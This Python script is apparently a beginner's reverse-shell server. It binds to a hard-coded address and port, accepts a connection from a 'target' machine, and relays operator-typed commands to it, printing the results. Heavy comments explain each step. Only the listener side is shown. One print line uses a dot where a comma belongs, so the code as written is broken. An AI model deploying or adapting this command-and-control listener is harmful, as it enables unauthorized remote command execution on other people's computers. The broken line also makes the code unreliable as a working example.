import socket  #server side

def connect():
    #socket: A network socket is an internal endpoint for sending or receiving da
#   ta within a node on a computer network
    # Every socket requires an IP and a port.  When it has both of these it is said to be
    # bound to that ip and port.  This means that it is able to recove data

    s=socket.socket() #creates a socket object s

    s.bind(("10.233.228.100",8080))
    #set queue to 1 session since we only want to listen to one other computer
    s.listen(1)

    #now we need to accept inbound connections
    #connection object, client ip that we want to run the shell on
    conn,addr=s.accept() # stores the value of s.accept into conn and addr

    print('[+] connection from:'.addr) #addr stores ip and port of the client

    #next define infinit loop and send to target

    while True:
        command=input("Shel> ") #get user input and store in command, what you want to run in temrinal
        if'terminate' in command:
            conn.send('terminate'.encode())
            conn.close() #close socket from our side
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode()) #1 kb of data, decode from bytes to unicode


def main():
    connect()
main()